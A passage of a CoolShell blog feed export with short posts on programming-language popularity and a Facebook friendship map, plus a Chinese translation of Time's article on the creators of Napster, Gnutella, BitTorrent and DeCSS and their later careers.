<meta itemprop="description" content="在网上看到一篇文章介绍五个免费开源的数据挖掘软件，转过来。
Orange
Orange 是一个基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，基绑定了Python以进行脚本开发。它包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。其由C++ 和 Python开发，它的图形库是由...">
<meta itemprop="datePublished" content="2010-12-13T08:41:11+08:00">
<meta itemprop="dateModified" content="2010-12-12T22:12:10+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3356.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3356.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.33">
<meta itemprop="ratingCount" content="9">
</div>
</div>
<div id="post-ratings-3356-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-13T08:41:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/3356.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 编程语言流行度 ]]></title>
<link>https://coolshell.cn/articles/3385.html</link>
<content><![CDATA[ 
<p>下面是一个关于编程语言流行度的图（以前本站也有一篇<a href="https://coolshell.cn/articles/706.html" target="_blank">编程语言流行度的文章</a>）。其X轴是从Github中取来的数据（项目数），而Y轴是从StackOverflow取来的（tag数）。注意：Github提供了语言流行度：<a href="https://github.com/languages">https://github.com/languages</a>，而本图的原始数据在<a href="http://www.dataists.com/wp-content/uploads/2010/12/language_ranks1.csv" target="_blank">这里</a>。</p>
<figure id="attachment_3386" aria-describedby="caption-attachment-3386" style="width: 581px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2010/12/rank_scatter1.png"><img alt="image placeholder" ></a><figcaption id="caption-attachment-3386" class="wp-caption-text">编程语言流行度（点击看大图）</figcaption></figure>
<p>来源：<a href="http://www.dataists.com/2010/12/ranking-the-popularity-of-programming-langauges/" target="_blank">http://www.dataists.com/2010/12/ranking-the-popularity-of-programming-langauges/</a></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/6639.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6639.html" class="wp_rp_title">千万别惹程序员 </a>
</li>
<li>
<a href="https://coolshell.cn/articles/4626.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4626.html" class="wp_rp_title">读书笔记：对线程模型的批评</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3100.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3100.html" class="wp_rp_title">编程语言进化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2724.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2724.html" class="wp_rp_title">计算机编程简史图</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2598.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2598.html" class="wp_rp_title">五个编程语言设计的失误</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2539.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2539.html" class="wp_rp_title">参透软件开发的本质 – Uncle Bob Martin 推荐的经典书籍</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3385" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="136df56fe7">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>8</strong> 人打了分，平均分： <strong>3.25</strong> )<br><span class="post-ratings-text" id="ratings_3385_text"></span><meta itemprop="name" content="编程语言流行度">
<meta itemprop="headline" content="编程语言流行度">
<meta itemprop="description" content="下面是一个关于编程语言流行度的图（以前本站也有一篇编程语言流行度的文章）。其X轴是从Github中取来的数据（项目数），而Y轴是从StackOverflow取来的（tag数）。注意：Github提供了语言流行度：https://github.com/languages，而本图的原始数据在这里。



来源：http://www.dataists.com/2010/12/ranking-th...">
<meta itemprop="datePublished" content="2010-12-13T09:12:56+08:00">
<meta itemprop="dateModified" content="2010-12-13T10:04:17+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3385.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3385.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.25">
<meta itemprop="ratingCount" content="8">
</div>
</div>
<div id="post-ratings-3385-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-13T09:12:56+08:00</pubDate>
<guid>https://coolshell.cn/articles/3385.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Facebook全球关系网 ]]></title>
<link>https://coolshell.cn/articles/3396.html</link>
<content><![CDATA[ 
<p><a href="https://www.facebook.com/paulgb">Paul Butler</a> 是Facebook的Data Infrastructure Engineering Team的一个实习生，他把Facebook 5亿用户的人际关系网给图示了出来（见下图，<a href="https://sphotos.ak.fbcdn.net/hphotos-ak-snc4/hs1382.snc4/163413_479288597199_9445547199_5658562_14158417_n.jpg" target="_blank">源图片</a>）挺赞的。从中我们可以看到，某些地方是一片漆黑……</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2010/12/Visualizing-Friendships-on-Facebook.png"><img alt="image placeholder" ></a>Facebook全球关系网<br>
(点击看大图，3.8M)</p>
<p style="text-align: left;">关于Paul是如何产生这个图的，你可以参看：<a href="https://www.facebook.com/notes/facebook-engineering/visualizing-friendships/469716398919" target="_blank">http://www.facebook.com/notes/facebook-engineering/visualizing-friendships/469716398919</a> （墙）</p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18140.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18140.html" class="wp_rp_title">关于Facebook 的 React 专利许可证</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7448.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7448.html" class="wp_rp_title">扎克伯格的一封信：关于Facebook IPO</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4939.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4939.html" class="wp_rp_title">Quora使用到的技术</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4549.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4549.html" class="wp_rp_title">Facebook 的系统架构</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1360.html" class="wp_rp_title">谁写了Linux</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3244.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3244.html" class="wp_rp_title">在线作图编辑服务</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3396" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="583512a601">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>3.91</strong> )<br><span class="post-ratings-text" id="ratings_3396_text"></span><meta itemprop="name" content="Facebook全球关系网">
<meta itemprop="headline" content="Facebook全球关系网">
<meta itemprop="description" content="Paul Butler 是Facebook的Data Infrastructure Engineering Team的一个实习生，他把Facebook 5亿用户的人际关系网给图示了出来（见下图，源图片）挺赞的。从中我们可以看到，某些地方是一片漆黑……
Facebook全球关系网
(点击看大图，3.8M)
关于Paul是如何产生这个图的，你可以参看：http://www.facebook.co...">
<meta itemprop="datePublished" content="2010-12-15T08:47:15+08:00">
<meta itemprop="dateModified" content="2010-12-14T22:27:28+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3396.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3396.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.91">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-3396-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-15T08:47:15+08:00</pubDate>
<guid>https://coolshell.cn/articles/3396.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 偷了世界的程序员 ]]></title>
<link>https://coolshell.cn/articles/3363.html</link>
<content><![CDATA[ 
<p>本文译自美国时代（time.com）的《<a href="https://www.time.com/time/specials/packages/printout/0,29239,2032304_2032746_2032903,00.html" target="_blank">The Men Who Stole the World</a>》，原作者：Lev Grossman。相当有传奇色彩，读起来很爽，翻译过来。译得不好，还请大家指正。本中的四个程序员可能并不是那么声名显赫，而且也很不老实，或许算不上成功，不过他们的确改变了世界。<strong>而本文有分析了互联网上P2P的那些事，相当的有参考价值</strong>。</p>
<p><em><span style="color: #993300;">2010年12月17日更新：修改了一些错误，理顺了一些语句。<br>
2010年12月19日更新：增加了一些插图。 </span></em></p>
<p>————————正文————————</p>
<p>十年前，有四个年轻人改变了这个世界的运作方式。他们使用的并不是法律或是武器或是金钱，而是使用软件来改变世界。他们当时有着激进和极具破坏性的想法，并把这些想法付诸于代码，在Internet上以免费自由方式发布。这四个人，没有一个完成了大学学业，却奠定了今天我们习惯的数字媒体环境的基础。然后，因为各种原因，他们也迅速地消失在公众视野中。</p>
<p>1999年，美国东北大学的一个叫Shawn Fanning的一年级新生开发Napster，从此，成为了P2P文件共享和不需要大型机构或零售商就可以获得音乐的先锋和范例。《时代周刊》和《财富》把他放上了封面。那时，他在19岁。</p>
<p>就在同一年，一个挪威的只有十几岁的年轻人 Jon Lech Johansen，他和另两个今天都不为人知的程序员，写下了一个程序解密了商业的DVD，而他成为了全球盛名的“ DVD Jon.”，那年，他只有15岁。</p>
<p>而在1997年，Justin Frankel，一个亚利桑那州塞多纳的18岁的黑客，开发了一个免费的MP3播放器——WinAmp，其成为了Windows操作系统上装机必备的软件，并造就了主流数字音乐的革命。在他发布的第18个月内，1500万人下载了这个软件。而三年后，Frankel 开发了 Gnutella，一个P2P的文件共享协议，没有中心结点，不像 Napster，其不可能被关闭。目前有上百万人还在使用它。</p>
<p>2001年，Bram Cohen, 当年 26 岁，开发了一个P2P的文件传输共享协议—— BitTorrent，其以全新一流的架构全面优化了网络上大文件的共享和传输效率。 BitTorrent 也变成了整个Internet上发布大数据和文件的一个标准。</p>
<p><span id="more-3363"></span></p>
<p>在 2000年代的上半段，《时代》采访了这四个程序员。那个时候，看起来他们要以数字化动乱把整个复杂的传统媒体娱乐平台给拆除，而对有版权的电影，音乐和电视的收费则变得困难和不可能，那些艺术家也将无法从他们作品得到报酬，整个娱乐业包括时代华纳也将被炸为平地。而盗版业则借着这四个程员的软件侵袭了美国公司。</p>
<p>“毕竟”，我们在2003年报道到：“在整个信息经济中，不可能所有的信息都是免费的”。如果毁灭正在来临，那么， Fanning, Johansen, Frankel 和 Cohen 将是那“<a href="https://zh.wikipedia.org/zh-cn/%E5%90%AF%E7%A4%BA%E5%BD%95%E4%B8%AD%E7%9A%84%E5%9B%9B%E9%AA%91%E5%A3%AB" target="_blank">四骑士</a>”（译注：启示录中的四骑士传统上被解释为瘟疫、战争、饥荒和死亡）。</p>
<p style="text-align: center;"><img alt="image placeholder" >Shawn Fanning（左） 和 Bram Cohen（右）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%B2%A1%E6%9C%89%E6%AF%81%E7%81%AD" title="没有毁灭">没有毁灭</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%B2%A1%E6%9C%89%E7%9B%97%E7%89%88%E7%9A%84%E4%BA%BA" title="没有盗版的人">没有盗版的人</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%9B%9B%E7%9C%BC%E6%80%AA%E5%85%BD" title="四眼怪兽">四眼怪兽</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%AE%80%E5%8D%95%E4%B9%8B%E9%81%93" title="简单之道">简单之道</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%B2%A1%E6%9C%89%E6%AF%81%E7%81%AD"></span><strong>没有毁灭</strong><span class="ez-toc-section-end"></span>
</h4>
<p><strong></strong>毁灭并没有发生。但是整个娱乐业因此而改变，而这些改变的复杂性和逐渐演进超出了我们的期望。这些发生的故事，海盗王们的事，对于今天数字化世界正在发生的事情有非常高的参考和教育价值。Fanning, Johansen, Frankel 和 Cohen 现在都硅谷运作着自己的小的，合法的软件公司。他们现在没有在做和盗版有干系的事情——当然，如果他们真的没有。</p>
<p>Fanning，四个人中唯一一个没有回复我们的采访请求的人，他较早地退出了毁灭传统唱片业的事业。在2001年，Napster因为不堪众多关于其协助并煽动版权侵权的法律诉论的重压，而不得不关闭。2002年，Fanning 创办了新的服务 Snocap —— 他尝试把文件共享合法化，在和相关的唱片公司合作下，Snocap 赋予消费者对其下载作品给于创作者报酬的权利。</p>
<p><img alt="image placeholder" ></p>
<p>但是，到那个时候，免费自由的文件共享程序像病毒一样的增涨，而用户则热衷于更换他们的音乐硬盘。他们仅在2001年8月一个月内就交换了30亿个文件。而要从这些文件交易中收到钱是根本不可能的。是的，要和免费竞争是很难的一件事。 Fanning 创造了一个连他自己都搞不定的怪物。</p>
<p>所以，他停止继续尝试Snocap下去。 Fanning 的下一个项目是给游戏玩家的社交网络叫 Rupture，最终，他在2008年时以1500万美金把其卖给了电子艺界Electronic Arts ——这是他的第一次发薪日。他现在又于2008年11月开了一个公司 Path， 其主要提供给iPhone手机进行照片分享的服务。</p>
<p>而Napster呢？今天他还在。这个商标在破产拍卖时被卖了，然后再被卖了，但其再也没有被 重建。现在其被  Best Buy 运营，其是 iTunes 的竞争者，其口号是—— “More than just a music store.” （不仅仅只是音乐商店）</p>
<h4>
<span class="ez-toc-section" id="%E6%B2%A1%E6%9C%89%E7%9B%97%E7%89%88%E7%9A%84%E4%BA%BA"></span>没有盗版的人<span class="ez-toc-section-end"></span>
</h4>
<p><strong></strong><br>
<img alt="image placeholder" >作为 Gnutella 的作者， Justin Frankel 是 Fanning 合法的继任者。不像 Fanning，他很早就收获了他的第一桶金。在1999年，当WinAmp大放光芒的时候，AOL买了WinAmp和他的公司——Nullsoft，价格应该在1亿美金左右。这让 Frankel 在20岁的时候就非常富有。当然，他也成了AOL的员工。</p>
<p>但这并不是很匹配，在Nullsoft, Frankel的做法是把软件开发到极致，然后免费发布出去。而在 AOL，软件的商业销售威胁并压倒了软件本身。“我致力于的产品，就像这样，我们不愿意金钱的掺入，我们正和其它公司做这笔交易，所以，产品也只能是这样的结果”，他回忆到，“没有人真正地去关心用户的体验是怎么样的”。</p>
<p>与此同时，Frankel 用他的业余时间开发 Gnutella 。这是一个很有才的软件，不像Napster，其是真正的分布式，没有中心服务器，这样，也没有那个“关闭按钮”让那些律师按。在2000年3月的时候，Gnutella上线，其发了一个贴子：“看见没？AOL也能给你一些好的东西！”，但是就算是这样，也没有换来AOL对其忠爱，而一大堆互联网公司在那时试图并入大的媒体公司，在Napster被诉讼的中期，2004年，他离开了AOL。</p>
<p>然后，他开始干了些有趣的事：他离开了他的成功地，他不用 Gnutella，也没有花一毛钱，就算是10年以后也是这样。 LimeWire —— 最流行的 Gnutella 客户端 —— 号称有 5千万用户。“当我开发它的时候，我最初主要是想用其在验证一下是否可行。所以我也不想从其中获益”，他说，“所以，甚至我和它一点关系也没有也说得通，其就是一个概念”。<img alt="image placeholder" ></p>
<p>Frankel 他最近从旧金山搬到了纽约城，现在全心打理自己的公司 Cockos (别问为什么叫这名)，这是一个关于音频产品套件，叫 Reaper。他坚持不懈地改进着它，并且他和他的用户保持着很近的关系，其用户数大约是几万人。“当前的策略我们并不想发展用户数量”，他说，“我们只是在享受目前的过程，并在做正确的事情”。他并不同意他是这个世界上最危险的geek，而滚石在2004年时对他则是这么认为的。“我不觉得盗版是很危险的”，他说，“根本上来说，大众的商业模式总是依赖于对所有事情的强控制——尤其是那些有瑕疵的模式。而作为一个软件开发者来说，多少会产生一定程度的盗版”， Gnutella 对他来说已是远古的事情了。“数字化盗版：它毁了唱片业了吗？没有。唱片业适应了吗？当然，很多人会说得更好。你应该更关注质量，以及更小一些乐队，等等这类的事”。</p>
<p>“至于音乐流行和排行这么大的市场，这点盗版算什么？” 他边说边笑道， “我希望就是这样。”</p>
<h4>
<span class="ez-toc-section" id="%E5%9B%9B%E7%9C%BC%E6%80%AA%E5%85%BD"></span><strong>四眼怪兽</strong><span class="ez-toc-section-end"></span>
</h4>
<p><strong></strong>在这四骑士中，只有 Bram Cohen他现在还在致力于其10年前的那个项目。他是 BitTorrent的创始人和首席科学家，而一个令人敬佩的旧金山的公司希望能把Cohen的这个令人瞠目的高效的内容分布式技术变成商业化应用。</p>
<p><img alt="image placeholder" ></p>
<p>这是一个奇特的公司：其合法的业务建立在一种仍然可能被用来进行大规模版权侵权的技术上。即使像 BitTorrent这样被8千万用户安装了的东西，其看上去还是像刚刚开始创业一样。 在BitTorrent上有相对较小的一部分是完全合法的 —— 最近的一个研究表明完全合法的部分占11%。而在这11%中，有更少的一部分产生了BitTorrent的收入。</p>
<p>就像 Fanning 的 Snocap 一样，Cohen 试图把其BitTorrent从大量的盗版领域转移到合法的领域，这样才能挣到钱。2007年是BT发展最震动的一年，BitTorrent成为了20世纪福克斯、派拉蒙、华纳兄弟 和 米高梅 影业公司的合作伙伴，和他们一起共同形成了 Torrent Entertainment Network，主要提供电影，电视，电子游戏的购买和零售。</p>
<p>就像 Fanning一样， Cohen 明了要摆脱盗版并不像看上去的那么容易。“所有的和它有关的事都是灾难”，他说到。Torrent Entertainment Network 于2008年底关闭。回想起来，你能明白这为什么不行。 BitTorrent在用户友好上做得还不够，并且，在其底层也不够有效率。它可以很快地像病毒一样地移动大量的数据。然后，当你要在上面算钱的时候，你不得不把速度给降下来，然后跟踪并控制其下载流，还和使用一些很扯淡的诸如“数字版权管理（DRM）”之流的技术，其大量地限制了用户那些是可以干的，哪些是要买的。</p>
<p>“我从这次失败中学到了很多很多的教训”， Cohen 悔恨地说。他现在的策略是只和那些只需要他的BT中的“快速”和“病毒式分布”的人合作。“与其去和那些内容提供商合作，为他们加上特权，以扩展我们的渠道，我们还不如直接获取那更大的渠道，那里的人更喜欢更为开放的方式”。</p>
<p>迄今，对些感兴趣的独立电影制片商叫 <em>Four Eyed Monsters</em> （四眼怪兽）和 一个叫 <em>Pioneer One </em>（<a href="https://movie.douban.com/subject/4901534/" target="_blank">先驱者一号</a>）的电视剧集的创作团队。说起来有点沮丧：Cohen正坐在一个消防水带上，一个程序员所梦想的成功的技术却失控了，而大的玩家又不想来玩。</p>
<p>以他的编码天份，Cohen可以很容易的进入一家大型的公司。但那并不是他的风格。“我的确需要一定的自由度”，他说。他现在正在开发一个全新的事情——一个P2P的实时数据流的系统，而不是分散的文件。这个项止将可能有巨大的潜力，尤其在新闻、体育等事的互联网上的现场直播。当然，他还在维护着 BitTorrent，但他没有花太多的时间在上面。他说：“当我开发它的时候我就知道没错”。</p>
<h4>
<span class="ez-toc-section" id="%E7%AE%80%E5%8D%95%E4%B9%8B%E9%81%93"></span><strong>简单之道</strong><span class="ez-toc-section-end"></span>
</h4>
<p><strong></strong>那么，在去年，盗版导致了什么？在美国，每个人都认为盗版对内容制造者的影响并没有那么坏。一份去年四月份美国审计署的报告，非常牵强地把盗版和滞销给联系在一起，但其结果尚无定论。</p>
<p>打击盗版在今天扁平化的世界上并不那么成功。无政府主义的世界观加上那些无与伦比的代码，不可能在那些合法的津津计较的商业界里传播。好的代码应该给用户有不同的选择，用户使用他们也并不一定是对行业有益的。而你真正需要的是向那些合法商业界挑战，挑战他们那些限制用户做用户想做的事的那种独裁性。（译注：这让我想到了腾讯360还有敏感词）</p>
<p>另外一个重要的原因是唱片业的灾难是不会发生的。Steve Jobs 在 2003年4月28日，那段时间是互联网文件共享井喷的时候，Apple揭开了iTunes Music Store的面纱。在那个时候，我们都觉得iTunes不可能成功，就像<a href="https://en.wikipedia.org/wiki/SNOCAP" target="_blank">Snocap</a>以及他和它类似的项目都以失败告终。这是因为，你怎么可以可能和免费竞争呢？</p>
<p>但是iTunes 确实成功了。Apple无情地强调着简单和有魅力的用户接口，以及有乔布斯对唱片业的那强有力的谈判，造就了一个最新型的专业的服务，其可以让你放心地下载并传输音乐。的确是做到了，尽管其是收费的，而且我们的购买需要和DRM（数字版权管理）扯上关系并限制我们。</p>
<p>于是，我们看到了可以和免费竞争的东西——简单（译注：个人以为可能还需要加上一点时尚）。Napster, Gnutella 和 BitTorrent 从来没有在用户友好度上到达像Apple那样的境界。从来没有人在网上检查并整理那些文件内容，所以，当那些众多的文件被共享时，我们可以看到，很多文件加杂时广告，色情，木马，病毒以及其它一些垃圾。当乔布斯为我们提供了那条简单之路，我们接受了。很明显，自由太过头——至少数字媒体是这样的。</p>
<p><img alt="image placeholder" >这是一个让那些年轻的海盗王们认真学习的教训。就像 Fanning, Frankel 和 Cohen一样， 其实，Jon Lech Johansen 并不能算得上是一个真正的海盗。他没有因为想把好莱坞搞破产而去帮助破解DVD，他这样做是因为他想在他的电脑上看电影。他的电脑安装的是Linux操作系统，而1999年，在Linux上根本没有可以用来播放DVD的程序，所以，他和他的伙伴们决定自己写一个，所以，他们不得不先把DVD给解密了。</p>
<p>当美国电影协会（ Motion Picture Association of America）发现了DVD被破解的这个事，其向挪威政府控告 Johansen，并拘留了他。 他在奥斯陆(挪威的首都)受审两次，不过两次都被宣告无罪。因为他解密的DVD是他付费购买的。</p>
<p>但Johansen真正的明白消费者对其购买的数字媒体的权利，这就好像一本书一样——我们可以不断的使用这本书，或是把这本书借出去，这是我们的权利。2005年， Johansen 去了加利福尼亚，在那里，他逆向工程了 FairPlay，这是苹果公司的用来保护其多媒体文件的DRM类软件（译注：这是苹果公司用来加密iPod的工具）。之后，他注意到了苹果公司产品的用户体验是多么的迷人，所以，他在想，应该把这些东西带给全世界给那些更为无序的非苹果的产品。</p>
<p><img alt="image placeholder" ></p>
<p>“我们看到这世上有很多很多的产品，但其并没有像他们那样良好地运作”，Johansen说，那时他26岁的程序员。“所以，我们应该开发一个系统，其可以让这些设备的整合起来并给消费者他一个相当不错的用户体验”。</p>
<p>所谓的 “我们”，就是 Johansen 自己的公司—— doubleTwist，这个公司于2007年创建。 doubleTwist 软件是免费的，是一种像<a href="https://zh.wikipedia.org/zh-cn/%E7%BE%85%E5%A1%9E%E5%A1%94%E7%9F%B3%E7%A2%91" target="_blank">罗塞塔石</a>一样的为数字多媒体软件文件开发的软件——它是可以翻译，和谐并组织大约500种不同设备的文件，把他们放在一起并提供一个相当漂亮的接口。其6月份， doubleTwist 摧出 Android App，当时就有超过50万的用户下载了（译注：大家可以<a href="https://www.google.com/search?q=doubleTwist+android+app" target="_blank">Google一下</a>，好评如潮）。去年， doubleTwist 开始了他的政变打出了这样的广告：“The Cure for iPhone Envy. Your iTunes library on any device. In seconds.”（嫉妒iPhone的对策。你的iTunes库可以在任何设备上，只需几秒钟。）它这个条幅挂在了苹果在旧金山的旗舰店的外墙上。</p>
<p>Johansen 拒绝承认他和盗版有关系。“至于我被所指责的，真的和我没有什么关系”，他说。“我支持公平使用，意思是你的确是需要合法地获得内容，但你应该有权利使用任何一款设备或是应用程序来查看那些内容”。 Johansen 像所有的海盗王一样，他总是能写好的代码，而这些好的代码给了人民使用的权力。这才是盗版灾难不会发生的真正原因。<strong>盗版永远不希望所有的音乐和电影或是其它的东西成为免费的，他们想要的“free”其实是自由！</strong></p>
<p>————————————正文结束————————————</p>
<p>最后一句话是点睛之笔，作者对这个世界的认识真是相当的透彻。所以，加粗了。我个人理解本文带给我如下的启示：</p>
<ol>
<li>年轻就应该豁得出去，就应该有天不怕地不怕的想法，并付诸于行动。</li>
<li>互联网上的盗版永远不会停止，与其说是盗版，其后面则是自由和无政府主义。</li>
<li>自由过度并不是那些利益集团所希望的，并可能会让你惹上麻烦，不过这世界总是因此而改变。</li>
<li>版权限制和免费并不是最好的，而最根本的是尊重用户的自由权以及不断地化繁为简以改善用户的体验。</li>
</ol>
<p>另，题外话，最近一段时间都在招人，有一天，一个同事和我说，“现在的这些程序员怎么回事啊？我问他们：‘你心目中的最牛的程序员是谁？’，居然回答不出来，有人说是Bill Gates，还有人说是马云，气死我了……”。我想想也真是可笑，难道，Dijkstra，Linus，Ken Thompson，Dennis Ritchie，Richard Steven，Bjarne Stroustrup…… 这些人不认识吗？就知道有钱人，哎，这个时代真是个文化缺失的年代！。</p>
<p>推荐本站的几篇文章：<a rel="bookmark" href="https://coolshell.cn/articles/2322.html">Unix传奇(上篇)</a>、<a rel="bookmark" href="https://coolshell.cn/articles/2324.html">Unix传奇(下篇)</a>、<a rel="bookmark" href="https://coolshell.cn/articles/2724.html">计算机编程简史图</a>、<a rel="bookmark" href="https://coolshell.cn/articles/2439.html">黑客的价值观</a>。</p>
<p>其实细想一下，不单单是我国的计算机文化都是那些肤浅的大公司的文化。</p>
<p>最后还是送给大家那句话——<strong>真正让我们成为局域网的不是那个墙，而是我们自己的肤浅</strong>。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
